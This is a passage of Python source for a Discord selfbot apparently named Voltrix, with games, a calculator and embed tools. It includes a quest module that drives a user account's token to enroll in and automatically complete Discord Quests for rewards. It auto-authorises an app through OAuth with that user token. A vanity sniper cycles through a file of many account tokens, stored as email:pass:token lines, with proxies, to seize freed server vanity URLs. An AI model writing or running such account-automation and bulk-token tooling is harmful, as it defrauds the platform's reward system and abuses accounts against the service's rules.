                                    config = json.load(f)
                            except:
                                config = {}
                            token = config.get("token")
                            if token:
                                service = QuestService(token)
                                async with aiohttp.ClientSession() as session:
                                    quests = await service.fetch_quests(session)
                                quests = [q for q in quests if not q.is_completed()]
                                if not quests:
                                    embed_res = {
                                        "title": "Voltrix Quest Completer",
                                        "description": "No active or incomplete quests found on this account.",
                                        "color": 0x00ffee
                                    }
                                    success = await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed_res])
                                    components_res = []
                                else:
                                    embed_res = make_quest_picker_embed(quests)
                                    components_res = make_quest_picker_components(quests)
                                    success = await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed_res], components=components_res)
                                
                                if not success:
                                    channel_id = d.get("channel_id")
                                    if channel_id:
                                        try:
                                            url_direct = f"https://discord.com/api/v10/channels/{channel_id}/messages"
                                            headers_direct = {
                                                "Authorization": f"Bot {self.bot_token}",
                                                "Content-Type": "application/json"
                                            }
                                            payload_direct = {"embeds": [embed_res]}
                                            if components_res:
                                                payload_direct["components"] = components_res
                                            async with aiohttp.ClientSession() as session:
                                                await session.post(url_direct, headers=headers_direct, json=payload_direct)
                                        except Exception as err:
                                            print(f"[SelfAppBot Quest Fallback] Fallback failed: {err}")
                            else:
                                embed_res = {
                                    "title": "Voltrix Quest Completer",
                                    "description": "Token not configured in config.json!",
                                    "color": 0xff0000
                                }
                                success = await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed_res])
                                if not success:
                                    channel_id = d.get("channel_id")
                                    if channel_id:
                                        try:
                                            url_direct = f"https://discord.com/api/v10/channels/{channel_id}/messages"
                                            headers_direct = {
                                                "Authorization": f"Bot {self.bot_token}",
                                                "Content-Type": "application/json"
                                            }
                                            async with aiohttp.ClientSession() as session:
                                                await session.post(url_direct, headers=headers_direct, json={"embeds": [embed_res]})
                                        except:
                                            pass
                            return

                        elif desc == "__QUESTALL__":
                            try:
                                with open('config.json', 'r') as f:
                                    config = json.load(f)
                            except:
                                config = {}
                            token = config.get("token")
                            if token:
                                await run_questall_flow(application_id, interaction_token, token, fallback_d=d)
                            return

                        elif desc == "__CALCULATOR__":
                            embed_res = {
                                "title": "Calculator <:calculator:1322954645387350116>",
                                "description": "```\n0\n```",
                                "color": 0x00ffee
                            }
                            components_res = make_calculator_components("0")
                            await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed_res], components=components_res)
                            return

                        elif desc.startswith("__TICTACTOE__"):
                            parts = desc.split("|")
                            p1_id = parts[1]
                            p2_id = parts[2]
                            
                            embed_res = {
                                "title": "Tic Tac Toe 🎮",
                                "description": f"Click any button to start! \n❌ <@{p1_id}> vs ⭕ <@{p2_id}>\n\n🎮 Turn: <@{p1_id}>",
                                "color": 0x00ffee,
                                "footer": {
                                    "text": f"TTT_GAME|{p1_id}|{p2_id}|{p1_id}"
                                }
                            }
                            board = [[" " for _ in range(3)] for _ in range(3)]
                            components_res = make_ttt_components(board)
                            await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed_res], components=components_res)
                            return

                        # Standard message / embed format using shared formatter
                        embed_json = build_selfapp_embed(header, desc, image, thumbnail, footer)
                        success = await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed_json])
                        
                        if not success:
                            # Callback failed (Unknown interaction/Webhook due to lag), fallback to direct Bot API send!
                            channel_id = d.get("channel_id")
                            if channel_id:
                                try:
                                    url_direct = f"https://discord.com/api/v10/channels/{channel_id}/messages"
                                    headers_direct = {
                                        "Authorization": f"Bot {self.bot_token}",
                                        "Content-Type": "application/json"
                                    }
                                    async with aiohttp.ClientSession() as session:
                                        await session.post(url_direct, headers=headers_direct, json={"embeds": [embed_json]})
                                except Exception as err:
                                    print(f"[SelfAppBot Callback Fallback] Fallback message send failed: {err}")
                    
                    asyncio.create_task(process_voltrix_command())

                elif cmd_name == "selfapp_embed":
                    ensure_selfapp_config()
                    try:
                        with open("config/selfapp_config.json", "r") as f:
                            embed_config = json.load(f)
                    except:
                        embed_config = {}

                    embed_json = make_preview_embed_json(embed_config)
                    components_json = make_select_menu_components()

                    payload = {
                        "type": 4,
                        "data": {
                            "embeds": [embed_json],
                            "components": components_json
                        }
                    }
                    await self.send_callback(interaction_id, interaction_token, payload)

            elif itype == 3:
                custom_id = data.get("custom_id")
                if custom_id.startswith("calc_"):
                    action = custom_id.replace("calc_", "")
                    message_data = d.get("message", {})
                    embeds = message_data.get("embeds", [])
                    current_screen = ""
                    if embeds:
                        current_screen = embeds[0].get("description", "0").replace("```\n", "").replace("\n```", "").strip()
                    
                    if current_screen == "0" or current_screen == "Error":
                        current_screen = ""
                        
                    if action == "clear":
                        new_screen = "0"
                    elif action == "equal":
                        try:
                            import re
                            expr = current_screen.replace(" ", "")
                            if re.match(r"^[0-9+\-*/.]+$", expr):
                                new_screen = str(eval(expr))
                            else:
                                new_screen = "Error"
                        except:
                            new_screen = "Error"
                    else:
                        op_map = {"add": "+", "sub": "-", "mul": "*", "div": "/"}
                        char = op_map.get(action, action)
                        new_screen = current_screen + char

                    if not new_screen:
                        new_screen = "0"
                        
                    new_embed = {
                        "title": "Calculator <:calculator:1322954645387350116>",
                        "description": f"```\n{new_screen}\n```",
                        "color": 0x00ffee
                    }
                    new_components = make_calculator_components(new_screen)
                    
                    payload = {
                        "type": 7,
                        "data": {
                            "embeds": [new_embed],
                            "components": new_components
                        }
                    }
                    await self.send_callback(interaction_id, interaction_token, payload)

                elif custom_id.startswith("ttt_"):
                    message_data = d.get("message", {})
                    embeds = message_data.get("embeds", [])
                    footer_text = ""
                    if embeds and embeds[0].get("footer"):
                        footer_text = embeds[0]["footer"].get("text", "")
                        
                    if not footer_text.startswith("TTT_GAME|"):
                        return

                    parts = footer_text.split("|")
                    p1_id = parts[1]
                    p2_id = parts[2]
                    current_turn_id = parts[3]
                    
                    clicker_id = d.get("member", {}).get("user", {}).get("id") or d.get("user", {}).get("id")
                    clicker_id = str(clicker_id)
                    
                    if clicker_id != current_turn_id:
                        payload = {
                            "type": 4,
                            "data": {
                                "content": "❌ It is not your turn!",
                                "flags": 64
                            }
                        }
                        await self.send_callback(interaction_id, interaction_token, payload)
                        return

                    components = message_data.get("components", [])
                    board = [[" " for _ in range(3)] for _ in range(3)]
                    for r, row in enumerate(components):
                        for c, btn in enumerate(row.get("components", [])):
                            label = btn.get("label", " ")
                            if label in ("X", "O"):
                                board[r][c] = label
                                
                    parts_btn = custom_id.split("_")
                    click_r = int(parts_btn[1])
                    click_c = int(parts_btn[2])
                    
                    if board[click_r][click_c] == " ":
                        symbol = "X" if clicker_id == p1_id else "O"
                        board[click_r][click_c] = symbol
                        
                        def check_winner(b):
                            for row in b:
                                if row[0] == row[1] == row[2] != " ":
                                    return row[0]
                            for col in range(3):
                                if b[0][col] == b[1][col] == b[2][col] != " ":
                                    return b[0][col]
                            if b[0][0] == b[1][1] == b[2][2] != " ":
                                return b[0][0]
                            if b[0][2] == b[1][1] == b[2][0] != " ":
                                return b[0][2]
                            return None

                        def is_full(b):
                            return all(cell != " " for row in b for cell in row)

                        winner = check_winner(board)
                        game_over = False
                        
                        if winner:
                            status_text = f"🎉 <@{clicker_id}> Won the game!"
                            game_over = True
                        elif is_full(board):
                            status_text = "🤝 **It's a Draw!**"
                            game_over = True
                        else:
                            next_turn_id = p2_id if clicker_id == p1_id else p1_id
                            status_text = f"🎮 Turn: <@{next_turn_id}>"
                            parts[3] = next_turn_id
                            
                        new_embed = {
                            "title": "Tic Tac Toe 🎮",
                            "description": f"❌ <@{p1_id}> vs ⭕ <@{p2_id}>\n\n{status_text}",
                            "color": 0x00ffee,
                            "footer": {
                                "text": "|".join(parts)
                            }
                        }
                        new_components = make_ttt_components(board, game_over=game_over)
                        payload = {
                            "type": 7,
                            "data": {
                                "embeds": [new_embed],
                                "components": new_components
                            }
                        }
                        await self.send_callback(interaction_id, interaction_token, payload)

                elif custom_id == "selfapp_customize_select":
                    val = data.get("values", [None])[0]
                    if val:
                        ensure_selfapp_config()
                        try:
                            with open("config/selfapp_config.json", "r") as f:
                                config = json.load(f)
                        except:
                            config = {}
                        current_val = config.get(val, "")
                        
                        payload = make_modal_payload(val, current_val)
                        await self.send_callback(interaction_id, interaction_token, payload)
                elif custom_id == "quest_select_menu":
                    quest_id = data.get("values", [None])[0]
                    if quest_id:
                        await self.send_callback(interaction_id, interaction_token, {"type": 6})
                        application_id = d.get("application_id")
                        async def load_control_panel():
                            try:
                                with open('config.json', 'r') as f:
                                    config = json.load(f)
                            except:
                                config = {}
                            token = config.get("token")
                            if token:
                                service = QuestService(token)
                                async with aiohttp.ClientSession() as session:
                                    quest = await service.refresh_quest(session, quest_id)
                                if quest:
                                    status = active_quest_states.get(quest_id, {}).get("status", "idle")
                                    percent = active_quest_states.get(quest_id, {}).get("percent", quest.progress_percent())
                                    speed_mode = active_quest_states.get(quest_id, {}).get("speed_mode", "fast")
                                    active_quest_states[quest_id] = {
                                        "speed_mode": speed_mode,
                                        "status": status,
                                        "percent": percent
                                    }
                                    
                                    embed = make_quest_control_embed(quest, status, percent, speed_mode)
                                    components = make_quest_control_components(quest_id, quest.is_enrolled())
                                    await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed], components=components)
                        asyncio.create_task(load_control_panel())
                elif custom_id.startswith("quest_btn_"):
                    parts = custom_id.split("_")
                    action = parts[2]
                    quest_id = parts[3]
                    
                    try:
                        with open('config.json', 'r') as f:
                            config = json.load(f)
                    except:
                        config = {}
                    token = config.get("token")
                    
                    await self.send_callback(interaction_id, interaction_token, {"type": 6})
                    
                    if token:
                        application_id = d.get("application_id")
                        
                        if action == "start":
                            existing = active_quest_tasks.get(quest_id)
                            if not (existing and not existing.done()):
                                task = asyncio.create_task(run_quest_worker(application_id, interaction_token, quest_id, token, fallback_d=d))
                                active_quest_tasks[quest_id] = task
                        elif action == "stop":
                            existing = active_quest_tasks.get(quest_id)
                            if existing and not existing.done():
                                existing.cancel()
                            if quest_id in active_quest_states:
                                active_quest_states[quest_id]["status"] = "stopped"
                            service = QuestService(token)
                            async with aiohttp.ClientSession() as session:
                                quest = await service.refresh_quest(session, quest_id)
                            if quest:
                                percent = active_quest_states.get(quest_id, {}).get("percent", quest.progress_percent())
                                speed_mode = active_quest_states.get(quest_id, {}).get("speed_mode", "fast")
                                embed = make_quest_control_embed(quest, "stopped", percent, speed_mode)
                                components = make_quest_control_components(quest_id, quest.is_enrolled())
                                await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed], components=components)
                        elif action == "normal":
                            if quest_id not in active_quest_states:
                                active_quest_states[quest_id] = {}
                            active_quest_states[quest_id]["speed_mode"] = "normal"
                            service = QuestService(token, speed_mode="normal")
                            async with aiohttp.ClientSession() as session:
                                quest = await service.refresh_quest(session, quest_id)
                            if quest:
                                status = active_quest_states[quest_id].get("status", "idle")
                                percent = active_quest_states[quest_id].get("percent", quest.progress_percent())
                                embed = make_quest_control_embed(quest, status, percent, "normal")
                                components = make_quest_control_components(quest_id, quest.is_enrolled())
                                await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed], components=components)
                        elif action == "fast":
                            if quest_id not in active_quest_states:
                                active_quest_states[quest_id] = {}
                            active_quest_states[quest_id]["speed_mode"] = "fast"
                            service = QuestService(token, speed_mode="fast")
                            async with aiohttp.ClientSession() as session:
                                quest = await service.refresh_quest(session, quest_id)
                            if quest:
                                status = active_quest_states[quest_id].get("status", "idle")
                                percent = active_quest_states[quest_id].get("percent", quest.progress_percent())
                                embed = make_quest_control_embed(quest, status, percent, "fast")
                                components = make_quest_control_components(quest_id, quest.is_enrolled())
                                await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed], components=components)
                        elif action == "enroll":
                            service = QuestService(token)
                            async with aiohttp.ClientSession() as session:
                                quest = await service.refresh_quest(session, quest_id)
                                if quest:
                                    await service.enroll(session, quest)
                                    quest = await service.refresh_quest(session, quest_id)
                                    if quest:
                                        status = active_quest_states.get(quest_id, {}).get("status", "idle")
                                        percent = active_quest_states.get(quest_id, {}).get("percent", quest.progress_percent())
                                        speed_mode = active_quest_states.get(quest_id, {}).get("speed_mode", "fast")
                                        embed = make_quest_control_embed(quest, status, percent, speed_mode)
                                        components = make_quest_control_components(quest_id, quest.is_enrolled())
                                        await edit_interaction_response(application_id, interaction_token, fallback_d=d, embeds=[embed], components=components)

            elif itype == 5:
                custom_id = data.get("custom_id")
                if custom_id and custom_id.startswith("selfapp_customize_modal:"):
                    key_name = custom_id.split(":", 1)[1]
                    
                    val = ""
                    for comp in data.get("components", []):
                        for sub in comp.get("components", []):
                            if sub.get("custom_id") == "value_input":
                                val = sub.get("value")
                    
                    ensure_selfapp_config()
                    try:
                        with open("config/selfapp_config.json", "r") as f:
                            config = json.load(f)
                    except:
                        config = {}
                    
                    config[key_name] = val
                    try:
                        with open("config/selfapp_config.json", "w") as f:
                            json.dump(config, f, indent=4)
                    except Exception as e:
                        print(f"Error saving config/selfapp_config.json: {e}")

                    embed_json = make_preview_embed_json(config)
                    payload = {
                        "type": 7,
                        "data": {
                            "embeds": [embed_json]
                        }
                    }
                    await self.send_callback(interaction_id, interaction_token, payload)

        except Exception as e:
            print(f"[SelfAppBot Interaction Error] {e}")

async def start_selfapp_bot():
    global selfapp_bot_client
    if not os.path.exists("config/bot_config.json"):
        return

    try:
        with open("config/bot_config.json", "r") as f:
            bot_config = json.load(f)
    except Exception as e:
        print(f"Failed to read config/bot_config.json: {e}")
        return

    bot_token = bot_config.get("BOT_TOKEN") or bot_config.get("bot_token")
    client_id = bot_config.get("CLIENT_ID") or bot_config.get("client_id")
    bot_name = bot_config.get("BOT_NAME") or bot_config.get("bot_name") or "VoltriX Prime"
    bot_avatar = bot_config.get("BOT_AVATAR") or bot_config.get("bot_avatar") or "assets/voltrix.png"

    if not bot_token or not client_id:
        print("BOT_TOKEN or CLIENT_ID missing in config/bot_config.json. Selfapp bot won't start.")
        return

    # 1. Update bot profile (username and avatar)
    image_data = None
    if bot_avatar:
        if bot_avatar.startswith("http://") or bot_avatar.startswith("https://"):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(bot_avatar) as resp:
                        if resp.status == 200:
                            image_bytes = await resp.read()
                            import base64
                            content_type = resp.headers.get("Content-Type", "image/png")
                            b64 = base64.b64encode(image_bytes).decode("utf-8")
                            image_data = f"data:{content_type};base64,{b64}"
            except Exception as e:
                print(f"Error downloading bot avatar: {e}")
        else:
            if os.path.exists(bot_avatar):
                try:
                    with open(bot_avatar, "rb") as f:
                        image_bytes = f.read()
                    import base64
                    ext = bot_avatar.split(".")[-1]
                    content_type = "image/jpeg" if ext in ("jpg", "jpeg") else "image/png"
                    if ext == "gif":
                        content_type = "image/gif"
                    b64 = base64.b64encode(image_bytes).decode("utf-8")
                    image_data = f"data:{content_type};base64,{b64}"
                except Exception as e:
                    print(f"Error reading local bot avatar: {e}")

    profile_url = "https://discord.com/api/v9/users/@me"
    profile_headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }
    profile_payload = {}
    if bot_name:
        profile_payload["username"] = bot_name
    if image_data:
        profile_payload["avatar"] = image_data

    if profile_payload:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.patch(profile_url, headers=profile_headers, json=profile_payload) as resp:
                    if resp.status == 200:
                        print("Bot developer profile updated successfully!")
                    else:
                        print(f"Failed to update bot profile: {resp.status} - {await resp.text()}")
        except Exception as e:
            print(f"Error updating bot profile: {e}")

    # 2. Auto-authorize bot on the user's account
    client_secret = bot_config.get("CLIENT_SECRET") or bot_config.get("client_secret")
    redirect_uri = bot_config.get("REDIRECT_URI") or bot_config.get("redirect_uri") or "http://localhost:3001"

    auth_headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            # Check existing tokens
            async with session.get("https://discord.com/api/v9/oauth2/tokens", headers=auth_headers) as resp:
                tokens = await resp.json()
            
            token_id_to_delete = None
            has_correct_scope = False
            if isinstance(tokens, list):
                for t in tokens:
                    if t.get("application", {}).get("id") == client_id:
                        scopes = t.get("scopes", [])
                        if "applications.commands" in scopes:
                            has_correct_scope = True
                        else:
                            token_id_to_delete = t.get("id")

            # Deauthorize if scopes are outdated
            if token_id_to_delete:
                print(f"[SelfAppBot] Outdated scopes found for client_id {client_id}. Deauthorizing...")
                del_url = f"https://discord.com/api/v9/oauth2/tokens/{token_id_to_delete}"
                async with session.delete(del_url, headers=auth_headers) as resp:
                    if resp.status == 204:
                        print("[SelfAppBot] Old authorization deleted.")
                        has_correct_scope = False

            # Authorize fresh if needed
            if not has_correct_scope:
                print("[SelfAppBot] Performing fresh auto-authorization...")
                auth_url = f"https://discord.com/api/v9/oauth2/authorize?client_id={client_id}&response_type=code&scope=identify%20applications.commands&integration_type=1"
                auth_payload = {
                    "authorize": True,
                    "permissions": "0",
                    "integration_type": 1,
                    "guild_id": None
                }
                async with session.post(auth_url, headers=auth_headers, json=auth_payload) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        location = data.get("location", "")
                        if "?code=" in location:
                            code = location.split("?code=")[1]
                            print("[SelfAppBot] Code retrieved. Exchanging code for token...")
                            
                            # Exchange token
                            token_url = "https://discord.com/api/v9/oauth2/token"
                            form_data = {
                                "client_id": client_id,
                                "client_secret": client_secret,
                                "grant_type": "authorization_code",
                                "code": code,
                                "redirect_uri": redirect_uri
                            }
                            async with session.post(token_url, data=form_data) as token_resp:
                                if token_resp.status == 200:
                                    print("[SelfAppBot] Code exchange successful. Bot fully authorized!")
                                else:
                                    print(f"[SelfAppBot] Code exchange failed: {token_resp.status} - {await token_resp.text()}")
                        else:
                            print("[SelfAppBot] Failed to parse code from authorization response.")
                    else:
                         print(f"[SelfAppBot] Fresh authorization failed: {resp.status} - {await resp.text()}")
            else:
                print("[SelfAppBot] Bot is already fully authorized with the correct scopes.")
    except Exception as e:
        print(f"Error auto-authorizing bot: {e}")

    # 3. Instantiate and start the bot client using raw WebSocket
    try:
        selfapp_bot_client = SelfAppGatewayClient(bot_token)
        await selfapp_bot_client.start()
    except Exception as e:
        print(f"Failed to start SelfApp Bot client: {e}")

class QuestCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def quests(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:quest:1533405689706446908> | **Quest** **:** **`{prefix}quest`**\n"
            f"<:quest:1533405689706446908> | **Quest All** **:** **`{prefix}questall`**\n"
            f"<:quest:1533405689706446908> | **Quest Notify** **:** **`{prefix}questnotify [enable/disable]`**\n"
            f"<:quest:1533405689706446908> | **Auto Quest** **:** **`{prefix}autoquest [enable/disable]`**\n"
            f"<:quest:1533405689706446908> | **Quest Webhook** **:** **`{prefix}questwebhook [url]`**\n"
            f"<:quest:1533405689706446908> | **Orb Badge** **:** **`{prefix}orbbadge`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:quest:1533405689706446908>__Quest Commands__<:Titanz:1281243489635405827>", description)

    @commands.command()
    async def quest(self, ctx):
        await send(ctx, description="__QUEST_PICKER__", force_selfapp=True)

    @commands.command()
    async def questall(self, ctx):
        await send(ctx, description="__QUESTALL__", force_selfapp=True)

    @commands.command()
    async def questnotify(self, ctx, option: str = None):
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
        except:
            config = {}

        if option in ("enable", "on", "yes", "true"):
            config["quest_notify_enabled"] = True
            enabled_str = "enabled"
        elif option in ("disable", "off", "no", "false"):
            config["quest_notify_enabled"] = False
            enabled_str = "disabled"
        else:
            current = config.get("quest_notify_enabled", False)
            config["quest_notify_enabled"] = not current
            enabled_str = "enabled" if not current else "disabled"

        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)

        await send(ctx, "Quest Notifications", f"Quest completion notifications are now **{enabled_str}**.", force_selfapp=True)

    @commands.command()
    async def autoquest(self, ctx, option: str = None):
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
        except:
            config = {}

        if option in ("enable", "on", "yes", "true"):
            config["autoquest_enabled"] = True
            enabled_str = "enabled"
        elif option in ("disable", "off", "no", "false"):
            config["autoquest_enabled"] = False
            enabled_str = "disabled"
        else:
            current = config.get("autoquest_enabled", False)
            config["autoquest_enabled"] = not current
            enabled_str = "enabled" if not current else "disabled"

        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)

        token = config.get("token")
        if config["autoquest_enabled"] and token:
            asyncio.create_task(run_autoquest_pass_now(token))

        await send(ctx, "Autoquest Solvers", f"Background autoquest solver loop is now **{enabled_str}**.", force_selfapp=True)

    @commands.command()
    async def questwebhook(self, ctx, url: str = None):
        if not url:
            await send(ctx, "Quest Webhook", "Please provide a valid webhook URL.", force_selfapp=True)
            return

        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
        except:
            config = {}

        config["quest_webhook_url"] = url
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)

        await send(ctx, "Quest Webhook", f"Quest notifications webhook URL updated successfully to:\n`{url}`", force_selfapp=True)

    @commands.command()
    async def orbbadge(self, ctx):
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
        except:
            config = {}
            
        token = config.get("token")
        if not token:
            await send(ctx, "Orb Badge Claim", "Token not configured in config.json!", force_selfapp=True)
            return

        await send(ctx, "Orb Badge Claim", "Attempting to claim the virtual currency orb badge...", force_selfapp=True)
        async with aiohttp.ClientSession() as session:
            result = await _claim_orb_badge(session, token)

        if result["status"] == "SUCCESS":
            extra = ""
            if isinstance(result.get("balance"), int):
                extra = f"\nDetected balance before claim: `{result['balance']}` orbs."
            await send(ctx, "Orb Badge Claim", f"Orb badge claimed successfully!{extra}", force_selfapp=True)
        else:
            await send(ctx, "Orb Badge Claim", f"Claim failed: {result.get('message', 'Redeem failed')} (code: {result.get('code', 'unknown')})", force_selfapp=True)

class VanitySniper(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # Initialize default config keys
        if "vanity_sniper" not in config:
            config["vanity_sniper"] = False
        if "vanities" not in config:
            config["vanities"] = {}
        if "vanity_delay" not in config:
            config["vanity_delay"] = 5
        if "vsniper_webhook" not in config:
            config["vsniper_webhook"] = ""
        save_config()

        # Initialize folders & files
        self.assets_dir = "Vanity Assets"
        if not os.path.exists(self.assets_dir):
            os.makedirs(self.assets_dir)
        for f_name in ["tokens.txt", "proxies.txt"]:
            path = os.path.join(self.assets_dir, f_name)
            if not os.path.exists(path):
                try:
                    with open(path, "w", encoding="utf-8") as f:
                        pass
                except:
                    pass

        self.vanity_sniper_task.change_interval(seconds=config.get("vanity_delay", 5))
        self.vanity_sniper_task.start()

    def cog_unload(self):
        self.vanity_sniper_task.cancel()

    def load_assets_file(self, filename):
        path = os.path.join(self.assets_dir, filename)
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f.read().splitlines() if line.strip()]
            except:
                pass
        return []

    async def check_vanity_available(self, session, vanity):
        url = f"https://discord.com/api/v9/invites/{vanity}"
        try:
            async with session.get(url) as response:
                return response.status == 404
        except Exception:
            return False

    async def snipe_vanity(self, session, vanity, target_server):
        tokens = self.load_assets_file("tokens.txt")
        if not tokens:
            print("[Vanity Sniper] No tokens found in Vanity Assets/tokens.txt")
            return False
            
        url = f"https://discord.com/api/v9/guilds/{target_server}/vanity-url"
        json_data = {"code": vanity}
        
        for token in tokens:
            # support email:pass:token format
            clean_token = token.split(":")[2] if "@" in token and ":" in token else token
            clean_token = clean_token.strip()
            
            headers = {
                "Authorization": clean_token,
                "Content-Type": "application/json"
            }
            try:
                async with session.patch(url, headers=headers, json=json_data) as response:
                    if response.status == 200:
                        return True
                    else:
                        print(f"[Vanity Sniper] Failed claim: Status {response.status}")
            except Exception as e:
                print(f"[Vanity Sniper] Exception during claim: {e}")
        return False

    async def log_vanity_attempt(self, session, vanity, target_server, success):
        log_message = f"✅ Successfully sniped `{vanity}` for `{target_server}`" if success else f"❌ Failed to snipe `{vanity}`"
        print(log_message)
        
        # Write to log file
        try:
            with open("vanity_sniper_logs.txt", "a", encoding="utf-8") as f:
                from datetime import datetime
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {log_message}\n")
        except Exception as e:
            print(f"Failed writing to vanity sniper logs: {e}")

        # Post to webhook
        webhook_url = config.get("vsniper_webhook")
        if webhook_url:
            try:
                await session.post(webhook_url, json={"content": log_message})
            except Exception as e:
                print(f"Failed posting log to webhook: {e}")

    @tasks.loop(seconds=5)
    async def vanity_sniper_task(self):
        if not config.get("vanity_sniper", False):
            return
        
        vanities = config.get("vanities", {})
        if not vanities:
            return
            
        async with aiohttp.ClientSession() as session:
            for vanity, target_server in list(vanities.items()):
                available = await self.check_vanity_available(session, vanity)
                if available:
                    success = await self.snipe_vanity(session, vanity, target_server)
                    await self.log_vanity_attempt(session, vanity, target_server, success)

    @commands.command(name="changevanity")
    @commands.has_permissions(manage_guild=True)
    async def changevanity(self, ctx, code):
        """Change the server's vanity URL."""
        await ctx.message.delete()
        try:
            await ctx.guild.edit(vanity_url_code=code)
            await send(ctx, "Vanity URL Changed", f"✅ Vanity URL changed to: **{code}**")
        except discord.Forbidden:
            await senderror(ctx, "Permission Denied", "❌ I don't have permission to change the vanity URL.")
        except discord.HTTPException as e:
            await senderror(ctx, "HTTP Error", f"❌ An error occurred: {e.text}")

    @commands.command(name="vanity_sniper")
    async def vanity_sniper(self, ctx, mode: str):
        """Enable or disable the vanity sniper loop."""
        await ctx.message.delete()
        if mode.lower() not in ["enable", "disable"]:
            return await senderror(ctx, "Invalid Mode", "❌ Use `.vanity_sniper enable` or `.vanity_sniper disable`.")
        
        config["vanity_sniper"] = mode.lower() == "enable"
        save_config()
        await send(ctx, "Vanity Sniper Status", f"✅ Vanity Sniper **{mode}d**!")

    @commands.command(name="vsniper_add")
    async def vsniper_add(self, ctx, vanity: str, target_server: str):
        """Add a vanity URL to the claim list for a specific server."""
        await ctx.message.delete()
        config["vanities"][vanity] = target_server
        save_config()
        await send(ctx, "Sniper Target Added", f"✅ Added `{vanity}` to the snipe list for server `{target_server}`.")

    @commands.command(name="vsniper_remove")
    async def vsniper_remove(self, ctx, vanity: str):
        """Remove a vanity URL from the claim list."""
        await ctx.message.delete()
        if vanity not in config["vanities"]:
            return await senderror(ctx, "Not Found", f"❌ `{vanity}` is not in the snipe list.")
        
        del config["vanities"][vanity]
        save_config()
        await send(ctx, "Sniper Target Removed", f"✅ Removed `{vanity}` from the snipe list.")

    @commands.command(name="vsniper_clear")
    async def vsniper_clear(self, ctx):
        """Clear all sniping targets from the list."""
        await ctx.message.delete()
        config["vanities"].clear()
        save_config()
        await send(ctx, "Sniper List Cleared", "✅ Cleared the vanity snipe list.")

    @commands.command(name="vanity_delay")
    async def vanity_delay(self, ctx, delay: int):
        """Set the loop interval (in seconds) for checking vanity availability."""
        await ctx.message.delete()
        if delay < 1:
            return await senderror(ctx, "Invalid Delay", "❌ Delay must be at least 1 second.")
        
        config["vanity_delay"] = delay
        save_config()
        self.vanity_sniper_task.change_interval(seconds=delay)
        await send(ctx, "Sniper Delay Updated", f"✅ Vanity sniper delay set to `{delay}` seconds.")

    @commands.command(name="vanity_list")
    async def vanity_list(self, ctx):
        """List all vanity targets and their target server IDs."""
        await ctx.message.delete()
        vanities = config.get("vanities", {})
        if not vanities:
            return await send(ctx, "Sniper List", "📌 No vanities in the sniping list.")
        
        snipes = "\n".join([f"🔹 `{v}` → `{s}`" for v, s in vanities.items()])
        await send(ctx, "Vanities Being Sniped", f"📌 **Vanities Being Sniped:**\n\n{snipes}")

    @commands.command(name="vsniper_webhook")
    async def vsniper_webhook(self, ctx, link: str):
        """Set a webhook URL to log claiming results to."""
        await ctx.message.delete()
        if not link.startswith("https://discord.com/api/webhooks/") and not link.startswith("https://discordapp.com/api/webhooks/"):
            return await senderror(ctx, "Invalid Webhook", "❌ Invalid webhook link!")
        
        config["vsniper_webhook"] = link
        save_config()
        await send(ctx, "Webhook Configured", "✅ Webhook saved for vanity logs.")

    @commands.command(name="vsniper_backup")
    async def vsniper_backup(self, ctx):
